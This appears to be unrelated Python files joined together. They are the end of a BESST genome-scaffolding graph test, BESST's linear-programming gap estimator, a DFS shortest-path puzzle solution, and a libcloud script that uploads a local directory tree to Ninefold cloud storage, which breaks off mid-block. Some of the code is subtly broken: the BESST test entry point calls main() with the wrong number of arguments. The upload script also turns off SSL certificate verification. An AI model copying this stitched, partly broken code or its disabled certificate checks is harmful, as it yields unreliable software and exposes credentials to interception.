        small_scaffolds_test[S.name] = S
    start = time()
    G_prime = nx.Graph()
    #G.add_nodes_from([(1, 'L'), (1, 'R'), (2, 'L'), (2, 'R'), (3, 'L'), (3, 'R'), (4, 'L'), (4, 'R'), (5, 'L'), (5, 'R')]) 
    for i in range(1, 7):
        G_prime.add_edge((i, 'L'), (i, 'R'), {'nr_links':0})
    G_prime.add_edges_from([((1, 'R'), (2, 'R'), {'nr_links':1}), ((3, 'L'), (4, 'L'), {'nr_links':1}), ((2, 'L'), (3, 'R'), {'nr_links':1}), ((1, 'R'), (5, 'L'), {'nr_links':2}),
                       ((5, 'R'), (4, 'L'), {'nr_links':3}), ((2, 'L'), (5, 'L'), {'nr_links':2}), ((1, 'R'), (4, 'L'), {'nr_links':8}), ((2, 'L'), (6, 'L'), {'nr_links':3}),
                       ((1, 'L'), (4, 'R'), {'nr_links':1}), ((1, 'L'), (4, 'L'), {'nr_links':1}), ((3, 'L'), (4, 'R'), {'nr_links':1}),
                        ((1, 'R'), (2, 'L'), {'nr_links':1}), ((1, 'R'), (5, 'R'), {'nr_links':1}), ((2, 'L'), (5, 'R'), {'nr_links':1})])
    G = nx.Graph()
    G.add_nodes_from([(1, 'L'), (1, 'R'), (4, 'L'), (4, 'R'), (6, 'L'), (6, 'R')])
    contigs = [1, 2, 3, 4, 5, 6]

    print 'Between'
    BetweenScaffolds(G, G_prime, small_scaffolds_test)
    start_node = (1, 'R')
    end_node = (4, 'L')
    print 'Within'
    already_visited = set(G.nodes())
    print already_visited
    WithinScaffolds(G, G_prime, small_scaffolds_test, start_node, end_node, already_visited, 0)
    elapsed = time() - start
    print 'time all paths: ', elapsed



'''
    Created on May 30, 2014

    @author: ksahlin

    This file is part of BESST.

    BESST is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    BESST is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with BESST.  If not, see <http://www.gnu.org/licenses/>.
    '''

import copy
import math
import random
from collections import Counter
import cPickle
import os
import subprocess
import mathstats.log_normal_param_est as lnpe


#import numpy as np


from mathstats.normaldist.normal import normpdf
from mathstats.normaldist.truncatedskewed import param_est as GC

from BESST.lp_solve import lp_solve


class LpForm(object):
    """docstring for LpForm"""
    def __init__(self):
        super(LpForm, self).__init__()
        self.rows = []
        self.b = []

    def add_objective(self, obj):
        self.obj = obj

    def add_constraint(self, expression, value):
        self.rows.append(expression)
        self.b.append(value)

    def standard_form(self):
        """
         Converts Ax' <=b
         to Ax = b, b >= 0
         by introducing slack/surplus variables
        """

        A = []
        c = []

        # build full tableau and convert to normal form if negative constants
        tot_slack_variables = len(self.rows)

        for i in range(len(self.rows)):
            ident = [0 for r in range(len(self.rows))]
            
            # if negative constant
            if self.b[i] < 0:
                # add a surplus variable 
                ident[i] = -1
                #reverse all other values
                self.rows[i] = [ -k for k in self.rows[i] ]
                self.rows[i] += ident 
                # change sign of constant
                self.b[i] = -self.b[i]

            # if positive constant
            else:
                # add a slack varaible
                ident[i] = 1
                self.rows[i] += ident
            
        A = self.rows

        c = self.obj + [0]*tot_slack_variables 
        return A, self.b, c


class Contig(object):
    """Container with contig information for a contig in a path"""
    def __init__(self, index, length):
        super(Contig, self).__init__()
        self.index = index
        self.length = length
        self.position = None
        

class Path(object):
    """Contains all information of a path. This is basically a supgraph of the 
    Scaffold graph in BESST contianing all contigs in a path that has high score 
    and is going to be made into a scaffold. 

    Path is an object with methods for calculating likelihood of a path given link observations.
    Due to computational requiremants, we don't calculate the true likelihoos all paths usually have thousands
    of links. Instead, we take the average link obervation between all contigs. This will not give true ML 
    estimates but speeds up calculation with thousands of x order. In practice, using average link obervation 
    For ML estimation will give a fairly good prediction. For this cheat, see comment approx 15 lines below.  """
    def __init__(self, ctg_lengths, observations, param):
        super(Path, self).__init__()
        self.mean = param.mean_ins_size
        self.stddev = param.std_dev_ins_size
        self.read_len = param.read_len
        self.contamination_ratio = param.contamination_ratio
        self.contamination_mean = param.contamination_mean
        self.contamination_stddev = param.contamination_stddev
        self.ctgs = []
        self.ctg_lengths = ctg_lengths
        for i,length in enumerate(ctg_lengths):
            self.ctgs.append(Contig(i, length))
        self.ctgs = tuple(self.ctgs)
        self.gaps = [0]*(len(ctg_lengths)-1) # n contigs has n-1 gaps between them, start with gap size 0  
        
        # get positions for when all gaps are 0
        self.update_positions()

        # let us cheat here! Instead of calculating likeliooods of thousands of
        # onservations we calculate the ikelihood for them average (mean) of the
        # observations and weight it with the number of observations
        self.mp_links = 0.0
        self.pe_links = 0.0
        obs_dict = {}


        if all(length in self.ctg_lengths for length in [670, 2093]) or all(length in self.ctg_lengths for length in [900, 3810]) or all(length in self.ctg_lengths for length in [2528, 591]) or all(length in self.ctg_lengths for length in [734, 257, 1548]):
            print >> param.information_file, ''
            print >> param.information_file, '' 
            print >> param.information_file, 'Setting up path', ctg_lengths
            for c1,c2,is_PE_link in observations:
                mean_obs, nr_obs, stddev_obs, list_of_obs = observations[(c1,c2,is_PE_link)]
                if is_PE_link:
                    mean_PE_obs = self.ctgs[c1].length + self.ctgs[c2].length - observations[(c1,c2,is_PE_link)][0] + 2*param.read_len
                    list_of_obs = [ self.ctgs[c1].length + self.ctgs[c2].length - obs + 2*param.read_len for obs in list_of_obs]
                    print >> param.information_file, 'PE LINK, mean obs:', mean_PE_obs, 'stddev obs:', stddev_obs, 'nr obs:', nr_obs, 'c1 length', self.ctgs[c1].length, 'c2 length', self.ctgs[c2].length
                    obs_dict[(c1, c2, is_PE_link)] = (mean_PE_obs, nr_obs, stddev_obs, list_of_obs)
                    self.pe_links += nr_obs
                    # if mean_PE_obs > self.contamination_mean + 6 * self.contamination_stddev:
                    #     self.observations = None
                    #     return None
                else:
                    #mean_obs = sum(observations[(c1,c2,is_PE_link)])/nr_obs
                    print >> param.information_file, 'MP LINK, mean obs:', mean_obs, 'stddev obs:', stddev_obs, 'nr obs:', nr_obs, 'c1 length', self.ctgs[c1].length, 'c2 length', self.ctgs[c2].length

                    obs_dict[(c1, c2, is_PE_link)] = (mean_obs, nr_obs, stddev_obs, list_of_obs)
                    self.mp_links += nr_obs
            print >> param.information_file, ''
            print >> param.information_file, ''


        for c1,c2,is_PE_link in observations:
            #nr_obs = len(observations[(c1,c2,is_PE_link)])
            mean_obs, nr_obs, stddev_obs, list_of_obs = observations[(c1,c2,is_PE_link)]
            if is_PE_link:
                mean_PE_obs = self.ctgs[c1].length + self.ctgs[c2].length - observations[(c1,c2,is_PE_link)][0] + 2*param.read_len 
                list_of_obs = [ self.ctgs[c1].length + self.ctgs[c2].length - obs + 2*param.read_len for obs in list_of_obs]
                #PE_obs = map(lambda x: self.ctgs[c1].length + self.ctgs[c2].length - x + 2*param.read_len ,observations[(c1,c2,is_PE_link)])
                #mean_obs = sum( PE_obs)/nr_obs
                obs_dict[(c1, c2, is_PE_link)] = (mean_PE_obs, nr_obs, stddev_obs, list_of_obs)
                self.pe_links += nr_obs
                # if mean_PE_obs > self.contamination_mean + 6 * self.contamination_stddev and not initial_path:
                #     self.observations = None
                #     return None
            else:
                #mean_obs = sum(observations[(c1,c2,is_PE_link)])/nr_obs
                obs_dict[(c1, c2, is_PE_link)] = (mean_obs, nr_obs, stddev_obs, list_of_obs)
                self.mp_links += nr_obs
            

        self.observations = obs_dict
        #print self.observations


        # for c1,c2 in self.observations:
        #     if self.observations[(c1,c2)][0] > 1500:
        #         print self.observations


    def get_distance(self,start_index,stop_index):
        total_contig_length = sum(map(lambda x: x.length ,filter(lambda x: start_index <= x.index < stop_index, self.ctgs) ))
        total_gap_length = sum(self.gaps[start_index:stop_index])
        index_adjusting = len(self.gaps[start_index:stop_index]) # one extra bp shifted each time
        return (total_contig_length, total_gap_length, index_adjusting)

    def update_positions(self):
        for ctg in self.ctgs:
            index = ctg.index
            ctg.position = sum(self.get_distance(0,index))

    # def get_inferred_isizes(self):
    #     self.isizes = {}

    #     for (c1,c2,is_PE_link) in self.observations:
    #         gap = self.ctgs[c2].position - (self.ctgs[c1].position + self.ctgs[c1].length) - (c2-c1) # last thing is an index thing
    #         #x = map(lambda obs: obs[0] + gap , self.observations[(c1,c2)]) # inferr isizes
    #         x = self.observations[(c1,c2,is_PE_link)][0] + gap
    #         self.isizes[(c1,c2,is_PE_link)] = x

    # def get_GapEst_isizes(self):
    #     self.gapest_predictions = {}
    #     for (i,j,is_PE_link) in self.observations:
    #         mean_obs = self.observations[(i,j,is_PE_link)][0]
    #         if is_PE_link:
    #             self.gapest_predictions[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
    #         else:
    #             self.gapest_predictions[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)

    #         #print mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
        


    # def new_state_for_ordered_search(self,start_contig,stop_contig,mean,stddev):
    #     """
    #         This function gives a new state between two contigs c1 and c2 in the contig path
    #         that we will change the gap size for.
    #         Currently, we change the gap to expected_mean_obs - mean_observation, e.g. a
    #         semi-naive estimation. More variablity in gap prediction could be acheved in the 
    #         same way as described for function propose_new_state_MCMC().
             
    #     """
    #     new_path = copy.deepcopy(self) # create a new state
    #     (c1,c2) = (start_contig,stop_contig)
    #     mean_obs = self.observations[(c1,c2,0)][0] if (c1,c2,0) in self.observations else self.observations[(c1,c2,1)][0]  # take out observations and
    #     exp_mean_over_bp = mean + stddev**2/float(mean+1)
    #     proposed_distance = exp_mean_over_bp - mean_obs # choose what value to set between c1 and c2 

    #     #print 'CHOSEN:', (c1,c2), 'mean_obs:', mean_obs, 'proposed distance:', proposed_distance
    #     (total_contig_length, total_gap_length, index_adjusting) = self.get_distance(c1+1,c2)
    #     #print 'total ctg length, gap_lenght,index adjust', (total_contig_length, total_gap_length, index_adjusting)
    #     avg_suggested_gap = (proposed_distance - total_contig_length) / (c2-c1)
    #     #print avg_suggested_gap, proposed_distance, total_contig_length, c2-c1
    #     for index in range(c1,c2):
    #         new_path.gaps[index] = avg_suggested_gap
    #     #new_path.gaps[index] = proposed_distance
    #     return new_path


    # def calc_log_likelihood(self,mean,stddev):
    #     log_likelihood_value = 0
    #     exp_mean_over_bp = mean + stddev**2/float(mean+1)
    #     for (c1,c2) in self.isizes:
    #         log_likelihood_value += math.log( normpdf(self.isizes[(c1,c2)],exp_mean_over_bp, stddev) ) * self.observations[(c1,c2)][1]
    #         #for isize in self.isizes[(c1,c2)]:
    #         #    log_likelihood_value += math.log( normpdf(isize,mean,stddev) )
            
    #     return log_likelihood_value

    # def calc_dist_objective(self):
    #     objective_value = 0
    #     self.get_GapEst_isizes()
    #     for (c1,c2, is_PE_link) in self.isizes:
    #         objective_value += abs(self.gapest_predictions[(c1,c2,is_PE_link)] - self.isizes[(c1,c2,is_PE_link)]) * self.observations[(c1,c2,is_PE_link)][1]
    #         #for isize in self.isizes[(c1,c2)]:
    #         #    objective_value += math.log( normpdf(isize,mean,stddev) )
            
    #     return objective_value

    def make_path_dict_for_besst(self):
        path_dict = {}
        for ctg1,ctg2 in zip(self.ctgs[:-1],self.ctgs[1:]):
            path_dict[(ctg1,ctg2)] = ctg2.position - (ctg1.position + ctg1.length) - 1                     
        #print path_dict
        return path_dict


    # def calc_probability_of_LP_solution(self, help_variables):
    #     log_prob = 0
    #     for (i,j,is_PE_link),variable in help_variables.iteritems():
    #         print self.contamination_ratio * self.observations[(i,j,is_PE_link)][1] * normpdf(variable.varValue,self.contamination_mean,self.contamination_stddev)
    #         if is_PE_link:
    #             try:
    #                 log_prob += math.log(self.contamination_ratio * self.observations[(i,j,is_PE_link)][1] * normpdf(variable.varValue,self.contamination_mean,self.contamination_stddev)) 
    #             except ValueError:
    #                 log_prob += - float("inf")
    #         else:
    #             try:
    #                 log_prob += math.log((1 - self.contamination_ratio) * self.observations[(i,j,is_PE_link)][1]* normpdf(variable.varValue,self.contamination_mean,self.contamination_stddev)) 
    #             except ValueError:
    #                 log_prob += - float("inf")
    #     return log_prob

    def LP_solve_gaps(self,param):
        exp_means_gapest = {}

        for (i,j,is_PE_link) in self.observations:
            mean_obs = self.observations[(i,j,is_PE_link)][0]
            if is_PE_link:
                exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                #print 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)

            else:
                if param.lognormal:
                    samples =  self.observations[(i,j,is_PE_link)][3]
                    exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + lnpe.GapEstimator(param.lognormal_mean, param.lognormal_sigma, self.read_len, samples, self.ctgs[i].length, c2_len=self.ctgs[j].length)
                else:
                    exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                    #print 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
        

        if all(length in self.ctg_lengths for length in [670, 2093]) or all(length in self.ctg_lengths for length in [900, 3810]) or all(length in self.ctg_lengths for length in [2528, 591]) or all(length in self.ctg_lengths for length in [734, 257, 1548]):

            for (i,j,is_PE_link) in self.observations:
                mean_obs = self.observations[(i,j,is_PE_link)][0]
                if is_PE_link:
                    #exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                    print >> param.information_file, 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)

                else:
                    #exp_means_gapest[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
                    print >> param.information_file, 'GAPEST:',mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)


        ####################
        ####### NEW ########
        ####################
        
        # convert problem to standard form 
        #  minimize    z = c' x
        # subject to  A x = b, x >= 0
        # b does not neccessarily need to be a positive vector

        # decide how long rows.
        # we need 2*g gap variables because they can be negative
        # and r help variables because absolute sign in objective function

        t = LpForm()  

        g = len(self.ctgs)-1
        r = len(self.observations)
        n = 2*g+r 

        #A = []
        #c = []
        #b = []
        # add  gap variable constraints g_i = x_i - y_i <= mean + 2stddev, x_i,y_i >= 0
        # gap 0 on column 0, gap1 on column 1 etc.

        for i in range(g):
            row = [0]*n
            row[2*i] = 1      # x_i
            row[2*i+1] = -1   # y_i
            #A.append(row)
            #b.append(self.mean + 2*self.stddev)
            t.add_constraint(row, self.mean + 2*self.stddev)

        # add r help variable constraints (for one case in absolute value)
        for h_index,(i,j,is_PE_link) in enumerate(self.observations):
            row = [0]*n
            
            # g gap variable constants
            for k in range(n):
                if i<= k <j:
                    row[2*k] = -1
                    row[2*k+1] =  1
            
            # r Help variables
            row[ 2*g + h_index] = -1

            # sum of "inbetween" contig lengths + observation
            constant =   sum(map(lambda x: x.length, self.ctgs[i+1:j])) + self.observations[(i,j,is_PE_link)][0]
            predicted_distance = exp_means_gapest[(i,j,is_PE_link)]

            t.add_constraint(row, constant - predicted_distance)

        # add r help variable constraints (for the other case in absolute value)
        for h_index,(i,j,is_PE_link) in enumerate(self.observations):
            row = [0]*n
            
            # q gap variable constants
            for k in range(n):
                if i<= k <j:
                    row[2*k] = 1
                    row[2*k+1] = -1
            
            # r Help variables
            row[ 2*g + h_index] = -1

            # sum of "inbetween" contig lengths + observation
            constant = sum(map(lambda x: x.length, self.ctgs[i+1:j])) + self.observations[(i,j,is_PE_link)][0]
            predicted_distance = exp_means_gapest[(i,j,is_PE_link)]

            t.add_constraint(row, predicted_distance - constant )

        # add objective row

        # calculate the total penalties of discrepancies of stddevs given assigned orientations
        # of all edges
        obj_delta_stddev = 0
        if self.contamination_ratio:
            obj_row = [0]*n
            for h_index,(i,j,is_PE_link) in enumerate(self.observations):
                n = self.observations[(i,j,is_PE_link)][1]
                obs_stddev = self.observations[(i,j,is_PE_link)][2]
                if is_PE_link:
                    obj_delta_stddev += abs(self.contamination_stddev - obs_stddev) * n
                else:
                    obj_delta_stddev += abs(self.stddev - obs_stddev) * n

                obj_row[ 2*g + h_index] = is_PE_link * n + (1-is_PE_link) * n
                #obj_row[ 2*g + h_index] = is_PE_link*self.stddev*n + (1-is_PE_link)*self.contamination_stddev * n

                #obj_row[ 2*g + h_index] = is_PE_link * self.stddev  * self.observations[(i,j,is_PE_link)][1] +  (1-is_PE_link) * self.contamination_stddev * self.observations[(i,j,is_PE_link)][1]
                # obj_row[ 2*g + h_index] = is_PE_link * self.stddev * (1 - self.contamination_ratio) * self.observations[(i,j,is_PE_link)][1] +  (1-is_PE_link) * self.contamination_stddev * (self.contamination_ratio)*self.observations[(i,j,is_PE_link)][1]
                t.add_objective(obj_row)
        else:
            obj_row = [0]*n
            for h_index,(i,j,is_PE_link) in enumerate(self.observations):
                obj_row[ 2*g + h_index] = self.observations[(i,j,is_PE_link)][1]
                t.add_objective(obj_row)

        A, b, c = t.standard_form()

        # sol_lsq =np.linalg.lstsq(A,b)
        # print "LEAST SQUARES SOLUTION:"
        # print sol_lsq[0]

        #t.display()

        # print 'Objective:', c 
        # for row in A:
        #     print 'constraint:', row
        # print 'constnts:', b
        lpsol = lp_solve(c,A,b,tol=1e-4)
        optx = lpsol.x
        # zmin = lpsol.fun
        # bounded = lpsol.is_bounded
        # solvable = lpsol.is_solvable
        # basis = lpsol.basis
        # print " ---->"
        # print "optx:",optx
        # print "zmin:",zmin
        # print "bounded:",bounded
        # print "solvable:",solvable
        # print "basis:",basis
        # print "-------------------------------------------"

        # print "LP SOLUTION:"
        # print optx

        # transform solutions to gaps back
        gap_solution = []
        for i in range(g):
            gap_solution.append( round (optx[2*i] -optx[2*i +1],0) )           

        self.objective = lpsol.fun

        # also add the penalties from the observed standard deviations
        #self.objective += obj_delta_stddev
        
        ctg_lengths = map(lambda x: x.length, self.ctgs)                    
        if 1359 in ctg_lengths and 673 in ctg_lengths: #len(path.gaps) >= 4:                    
            print 'Obj:',self.objective                    
            print "of which stddev contributing:", obj_delta_stddev                    
        #print "objective:",self.objective
        
        return gap_solution

    def __str__(self):
        string= ''
        for ctg in self.ctgs:
            string += 'c'+str(ctg.index) +',startpos:'+ str(ctg.position)+',endpos:'+str(ctg.position + ctg.length)+'\n'

        return string

        
# def ordered_search(path):

#     path.get_inferred_isizes()

#     for c1 in range(len(path.ctgs)-1):
#         for c2 in range(c1+1,len(path.ctgs)):
#             if (c1,c2) in path.observations:
#                 suggested_path = path.new_state_for_ordered_search(c1,c2,path.mean,path.stddev)
#                 suggested_path.update_positions()
#                 suggested_path.get_inferred_isizes()
#                 suggested_path.calc_dist_objective()
#                 if suggested_path.calc_dist_objective() < path.calc_dist_objective():
#                     #print "SWITCHED PATH TO SUGGESTED PATH!!"
#                     path = suggested_path
#                     #print path
#                 else:
#                     pass
#                     #print 'PATH not taken!'
#             else:
#                 continue
      
#     # print 'FINAL PATH:'
#     # print path
#     # print 'With likelihood: ', path.calc_log_likelihood(mean,stddev)  

#     return path



def main(contig_lenghts, observations, param):
    """
    contig_lenghts: Ordered list of integers which is contig lengths (ordered as contigs comes in the path)
    observations:  dictionary oflist of observations, eg for contigs c1,c2,c3
                    we can have [(c1,c2):[23, 33, 21],(c1,c3):[12,14,11],(c2,c3):[11,34,32]]
    """

    path = Path(contig_lenghts,observations, param)
    
    if path.observations == None:
        return None

    # ML_path = MCMC(path,mean,stddev)
    # ML_path = ordered_search(path,mean,stddev)

    optimal_LP_gaps = path.LP_solve_gaps(param)
    path.gaps = optimal_LP_gaps
    ctg_lengths = map(lambda x: x.length, path.ctgs)
    if all(length in ctg_lengths for length in [670, 2093]) or all(length in ctg_lengths for length in [900, 3810]) or all(length in ctg_lengths for length in [2528, 591]) or all(length in ctg_lengths for length in [734, 257, 1548]):  #len(path.gaps) >= 4:
        print >> param.information_file, 'Solution:', path.gaps
        print >> param.information_file, "objective:",path.objective
        print >> param.information_file, 'ctg lengths:', map(lambda x: x.length, path.ctgs)
        print >> param.information_file, 'mp links:', path.mp_links
        print >> param.information_file, 'pe links:', path.pe_links
        print >> param.information_file, 'PE relative freq', path.pe_links / (path.pe_links + path.mp_links)

    path.update_positions()

    # print 'MCMC path:'
    # print ML_path
    # print 'MCMC path likelihood:',ML_path.calc_log_likelihood(mean,stddev)
    # print 'Ordered search path:'
    # print ML_path
    # print 'Ordered search likelihood:',ML_path.calc_log_likelihood(mean,stddev)
    # return ML_path

    return path

if __name__ == '__main__':
    contig_lenghts = [3000,500,500,500,3000]
    observations_normal = {(0,1):[1800,2000], (0,2):[1500,1800,1400,1700], (0,3):[1200,800,1000], 
                    (1,2):[750,800],(1,3):[600,700], (1,4):[300,600,700],
                    (2,3):[700,750], (2,4):[1400,1570],
                    (3,4):[2000,1750], }

    observations_linear = {(0,1):[450,500],  (1,2):[750,800],
                    (2,3):[700,750], (3,4):[400,170]}

    # The imortance of support:
    # one edge with a lot of observatins contradicting the others
    observations_matter = {(0,1):[450,500],  (1,2):[750,800],
                    (2,3):[700,750], (3,4):[400,170],
                    (0,4):[700]*30 }

    # long contig, 500bp gap, 3*short_contigs, long contig
    observations = {(0,1):[1450,1300,1200,1570], (0,2):[700,800,1000], (0,3):[250,300],
                    (1,2):[900],(1,3):[900,800], (1,4):[800,900,1000],
                    (2,3):[900], (2,4):[900,800],
                    (3,4):[1500,1750,1350,1900,1950] }

    # negative gaps test case here:

 
    mean = 1500
    stddev = 500
    read_len = 100
    main(contig_lenghts,observations,mean,stddev, read_len)



def inp():
    first_line = input().split(" ")
    num_points, num_trails = int(first_line[0]), int(first_line[1])
    adj_lst = {i: set() for i in range(num_points)}
    trail_len = {}
    trail_len_duplicate_count = {}
    for i in range(num_trails):
        trail = input().split(" ")
        node1, node2, length = int(trail[0]), int(trail[1]), int(trail[2])
        if node1 != node2:
            adj_lst[node1].add(node2)
            adj_lst[node2].add(node1)
            key = frozenset((node1, node2))
            if key in trail_len and length >= trail_len[key]:
                trail_len_duplicate_count[key] += 1 if length == trail_len[key] else 0
            else:
                trail_len[key] = length
                trail_len_duplicate_count[key] = 1
    return num_points, adj_lst, trail_len, trail_len_duplicate_count


def main():
    num_points, adj_lst, trail_len, trail_len_duplicate_count = inp()
    # print(adj_lst)
    # print(trail_len)
    # print(trail_len_duplicate_count)
    shortest_path = sum(trail_len.values())
    flower_path = set(trail_len.keys())

    def dfs_recur(current_node, path):                    
        # print(path)
        nonlocal shortest_path, flower_path
        if current_node == num_points - 1:
            edges = [frozenset((path[i], path[i+1])) for i in range(len(path) - 1)]
            length = sum(trail_len[edge] for edge in edges)
            if length < shortest_path:
                flower_path = set(edges)
                shortest_path = length
            elif length == shortest_path:
                flower_path = flower_path.union(edges)
        else:
            for node in adj_lst[current_node]:
                if node not in path:                    
                    path.append(node)
                    dfs_recur(node, path)                    
                    path.pop()

    dfs_recur(0, [0])                    
    # print(flower_path)
    return sum(trail_len[path] * trail_len_duplicate_count[path] for path in flower_path) * 2

if __name__ == '__main__':
    print(main())

from libcloud.storage.types import Provider
from libcloud.storage.providers import get_driver
from libcloud.storage.types import ContainerDoesNotExistError
from libcloud.storage.drivers.atmos import AtmosError
import libcloud.security
import libcloud.storage
from pprint import pprint
import string
import os
import datetime
import time
import sys
import logging
import mimetypes
mimetypes.init()
mimetypes.add_type('text/plain', '.bak', strict=True)
mimetypes.add_type('text/plain', '.php', strict=True)

# Checking that all the arguments were entered on the command line, exiting with a message if not.
if len(sys.argv) < 5:
    argumentsnotset = '\nError: one or more arguments were not passed. \n\nUsage is like so: \n\nPython Shoveller-Cloud.py access-token.txt shared-secret.txt STARTING-DIRECTORY-PATH datestamp=on'
    print argumentsnotset
    sys.exit(1)	                    

#Set command line arguments and default variables
# Processing text file to retrieve access token
access_token_file = open(sys.argv[1])
for line in access_token_file:
    access_token = line.rstrip()
access_token_file.close()
#print 'Access Token = ', access_token
# Processing text file to retrieve shared secret
shared_secret_file = open(sys.argv[2]) 
for line in shared_secret_file:
    shared_secret = line.rstrip()
shared_secret_file.close()
#print 'Shared Secret = ', shared_secret
scandir = sys.argv[3]
print 'Processing string for starting directory: ' + scandir
scandir=(string.replace(scandir, "\\", "/"))
#print 'Slashes flipped in starting directory: ' + scandir
#scandir = "/test"
loggydatestamp = datetime.date.today().strftime("%d-%B-%Y")
date_stamp_toggle = sys.argv[4]
if (date_stamp_toggle == "datestamp=on"):
    rootstring="O"
    print 'Datestamping is ON'
    datestamp = datetime.date.today().strftime("%d-%B-%Y")
    #print datestamp
    container_name = (datestamp)
else:
    print 'Datestamping is OFF'
    rootstring=''
    datestamp=''
    container_name = ('')
# Set up logging file
logfilename = loggydatestamp + '-Shoveller-Cloud' + '.log'
print 'Logging to ' + logfilename
logging.basicConfig(filename=logfilename,filemode='w',level=logging.INFO,format='%(asctime)s %(message)s')
initialloggystring = 'New scan started.' + loggydatestamp
print initialloggystring
logging.info(initialloggystring)
errorcount = 0

print '\nLogging in...'
#Security Block -- Logging in with our certificates
libcloud.security.VERIFY_SSL_CERT = False
Ninefold = get_driver(Provider.NINEFOLD)
driver = Ninefold(access_token, shared_secret)
# This plays out as driver = Ninefold('YOUR Atmos Access Token HERE', 'YOUR Atmos Shared Secret HERE')

#Functions for printing the list of files and folders in cloud storage
def showcloudassets():
    try:
        containers = driver.list_containers()
        print '\nList of Containers\n'
        pprint(containers)
        print '\n'
    except:
        print "*** Error occurred: ", sys.exc_info()[0] , " ***"
        print 'Exiting...'
        sys.exit(1)	                    

#showcloudassets()

#Scanning all children of the starting directory
allfiles = [] #store all files found
alldirs = [] #store all directories found
for root,dir,files in os.walk(scandir):	
    if (rootstring=="O"): 
        #Code to convert backslashes to forward slashes
        rootstring=(string.replace(root, "\\", "/"))
        alldirs.append(rootstring)
        try:
            container=driver.get_container(datestamp) #Check for the file's existence in cloud storage
            print "\nBase directory already exists: " + datestamp + " -- skipping."                    
#            time.sleep(10)
        except ContainerDoesNotExistError:
            container=driver.create_container(datestamp)
            baseloggystring = '\nCreating base directory in cloud storage with name: ' + loggydatestamp
            print baseloggystring
            logging.info(baseloggystring)
#            time.sleep(10)
    dirlist = [ os.path.join(root,di) for di in dir ]
    for d in dirlist: 
        #Code to convert backslashes to forward slashes
        d=(string.replace(d, "\\", "/"))
        d=(string.replace(d, " ", "_"))
        alldirs.append(d)
        container_name = d
    filelist = [ os.path.join(root,fi) for fi in files ]
    for f in filelist:
        f=(string.replace(f, '\\', '/'))
        allfiles.append(f)
        object_name = f
print "\n"

def showlocalassets():
    print ('List of local files that will be uploaded:\n\n')
    for a in allfiles:
        print "file: ", a
    for z in alldirs:
        print "directory: ", z
    print ('\nEnd list of local files.\n')

showlocalassets()

#Upload folders to Cloud Storage
print "\n*** BEGIN UPLOAD PROCESS ***"
print "\n*** CREATING DIRECTORIES IN CLOUD***\n"
for d in alldirs:
    container_name = (datestamp + d)
    try:
        container=driver.get_container(container_name) #Check for the file's existence in cloud storage
        print "\n* Directory already exists (skipping):\n" + datestamp + d                    
    except ContainerDoesNotExistError:
        folderloggystring = '\n* Creating directory in Cloud Storage: \n'+ loggydatestamp + d
        print folderloggystring
        logging.info(folderloggystring)
        container = driver.create_container(container_name=container_name)
print "\nFinished creating directories.\n"

#Upload files to Cloud Storage
print "\n*** UPLOADING FILES TO CLOUD ***\n"
for f in allfiles:
    local_path = (f)
    f=(string.replace(f, " ", "_")) # Converting spaces to underscores
    cloud_path = (datestamp + f)
    #print '\nProcessing: ' + f 
    try:
        container=driver.get_container(datestamp + f) #Check for the file's existence in cloud storage
        print "\n* File already exists (skipping):\n" + cloud_path                    
    except ContainerDoesNotExistError:
        uploadloggystring = "\n* Uploading to Cloud Storage: " + cloud_path
        print uploadloggystring
        logging.info(uploadloggystring)
        URL = (cloud_path)
        #print "\nSplitting off the file name from: " + URL
        file_name = URL.rsplit('/', 1)[1] # Split off the filename from path
        #print 'RESULTS OF FILENAME SPLIT-OFF: ' + file_name
        path_directory = URL.rpartition('/') # Split off the pathname from path
        #print 'RESULTS OF PATHNAME SPLIT-OFF: ' + path_directory[0]
        #print 'local_path = ' + local_path
        #print 'path_directory[0] = ' + path_directory[0]
        container=driver.get_container(path_directory[0])
        #print 'file_name = ' + file_name
        #Adding a content-type setting
        detected_file_type = mimetypes.guess_type(local_path)
        printable_file_type = detected_file_type[0]
        if printable_file_type == None:
            printable_file_type = 'application/binary'
        extra_settings = {'content_type':printable_file_type}
        try:
